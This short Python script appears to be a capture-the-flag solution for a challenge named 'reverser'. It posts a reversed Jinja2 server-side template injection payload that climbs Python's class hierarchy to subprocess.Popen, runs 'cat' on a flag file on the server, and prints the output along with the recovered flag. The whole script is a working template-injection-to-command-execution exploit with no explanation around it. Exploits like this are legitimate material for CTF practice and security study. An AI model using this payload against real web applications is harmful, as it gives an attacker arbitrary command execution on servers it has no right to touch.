import requests, html

URL = "https://reverser.mc.ax/"

cmd = "cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt"
payload = """{{''.__class__.__mro__[1].__subclasses__()[273](args=['"""+cmd+"""'], shell=True,stdout=-1).communicate()[0].strip()}}"""
payload = payload[::-1]
req = requests.post(URL, data={"text": payload})
print(html.unescape(req.text))

# hope{cant_misuse_templates}

